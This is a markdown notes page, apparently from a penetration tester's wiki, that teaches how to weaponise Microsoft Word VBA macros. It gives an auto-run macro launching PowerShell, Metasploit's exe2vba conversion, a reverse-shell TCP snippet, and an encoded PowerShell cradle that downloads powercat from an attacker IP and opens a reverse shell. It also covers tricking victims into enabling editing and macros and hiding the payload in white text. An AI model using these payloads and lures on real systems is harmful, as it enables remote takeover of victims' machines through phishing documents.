---
title: Macros
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - exploitation
  - technique
  - macros
  - msoffice
  - wordpress
---

### Macros

Macros in [_Visual Basic for Applications_](https://docs.microsoft.com/en-us/office/vba/api/overview/) (VBA) provide full access to [_ActiveX objects_](https://en.wikipedia.org/wiki/ActiveX) and the Windows Script Host, similar to JavaScript in HTML applications.

Keep in mind that older client-side attack vectors, such as [_Dynamic Data Exchange_](https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN) (DDE) and [_Object Linking and Embedding_](https://en.wikipedia.org/wiki/Object_Linking_and_Embedding) (OLE), no longer work reliably without significant system modifications.



If we successfully manage to deliver the Office document to our target via email or download link, the file will be tagged with the [_Mark of the Web_](https://attack.mitre.org/techniques/T1553/005/) (MOTW). Office documents tagged with MOTW will open in [_Protected View_](https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653), which disables all editing and modification settings in the document and blocks the execution of macros or embedded objects. When the victim opens the MOTW-tagged document, Office will show a warning with the option to _Enable Editing_.

- ZIP (baseline): Since 2022, Windows propagates MOTW to extracted files.
- 7-Zip (.7z): Historically effective, now inconsistent:
	- Explorer extraction → MOTW preserved
	- Older 7-Zip versions → sometimes stripped
- ISO / IMG (disk images): Used to be effective, now mostly mitigated:
	- Mounted ISO inherits MOTW
	- Mount ISO → files appear as local disk - No MOTW propagation

Administrators can also enforce these various protections at the AD Group Policy level, preventing domain-attached machines from exiting the Protected View, or running macros at all. These kinds of protections can't be overridden by individual users.

When the victim enables editing, the protected view is disabled. Therefore, the most basic way to overcome this limitation is to convince the target to click the _Enable Editing_ button by, for example, blurring the rest of the document and instructing them to click the button to "unlock" it.

We could also rely on other macro-enabled Microsoft Office programs that lack Protected View, like _Microsoft Publisher_, but this is less frequently installed.

Finally, we must consider [Microsoft's announcement](https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805) that discusses blocking macros by default. This change affects Access, Excel, PowerPoint, Visio, and Word. Microsoft implemented this in most Office versions such as Office 2021 all the way back to Office 2013.

MOTW is not added to files on FAT32-formatted devices.

## How to


Create a blank Word document with **mymacro** as the file name and save it in the **.doc** format. This is important because the newer **.docx** file type cannot save macros without attaching a containing template. This means that we can run macros within **.docx** files but we can't embed or save the macro in the document. In other words, the macro is not persistent. Alternatively, we could also use the **.docm** file type for our embedded macro.

After we save the document, we can begin creating our first macro. To get to the macro menu, we'll click on the _View_ tab from the menu bar where we will find and click the _Macros_ element:


**1.** Craft an executable

Use for instance [veil](veil.md).

Some examples:

**Macro automatically executing powershell.exe after opening the Document**

```vba
Sub AutoOpen()
  MyMacro
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
```



**2.** Convert it to a VisualBasic script - macro code. [Documentation about VBA](https://learn.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office)

**2.1. Method 1:**

```bash
locate exe2vba
# Result: /usr/share/metasploit-framework/tools/exploit/exe2vba.rb

# Go to the folder
cd /usr/share/metasploit-framework/tools/exploit/

# Create the malicious vba script
./exe2vba.rb <first-parameter> path/to/nameOfOutputFile.vba
# first parameter: malicious executable file that will be converted to macro code. Take the path to the .exe file provided by veil
```


**2.2. Method 2: Project reverse**

Another interesting script is the VBA Macro (powershell base64) available from my [reverse project repo](https://amandaguglieri.github.io/reverse/), which makes a simple connection with:

 ```
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001)
 ```

Just go to [Reverse project repo](https://amandaguglieri.github.io/reverse/), and select the VBA macro.


**2.3. Method 3: downloading powercat and establishing the connection**

If we want to have a macro with a more sophisticated payload that:

1. Downloads powercat.ps1
2. Initiates a connection with powercat.ps1

We can define the initial payload like this:

```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157/powercat.ps1');powercat -c 192.168.45.157 -p 4444 -e powershell
```

Then, use the following Python script to split the base64-encoded string into smaller chunks of 50 characters and concatenate them into the _Str_ variable. 

```bash
bash << 'EOF'
payload=$(echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157/powercat.ps1');.\powercat.ps1 -c 192.168.45.157 -p 4444 -e powershell" | iconv -t UTF-16LE | base64 -w 0)

str="powershell.exe -nop -w hidden -enc $payload"

n=50
len=${#str}

for (( i=0; i<len; i+=n )); do
    echo "str = str + \"${str:i:n}\""
done
EOF
```

Same thing in python would be:

```
# conver the payload
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157/powercat.ps1');powercat -c 192.168.45.157 -p 4444 -e powershell
# to base64


str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')

```

In any case, after the macro is executed, we receive a GET request for the PowerCat script in our Python3 web server and an incoming reverse shell in our Netcat listener.



**3.** Create an MS Word document

**4.** Open a new macro and embed macro code

**5.** Copy the payload as text in the word document. If it's too long, disguise it (set font color to white).

**6.** Convince the victim to have macros enabled.

**7.** Start a listener and wait for the victim to connect.



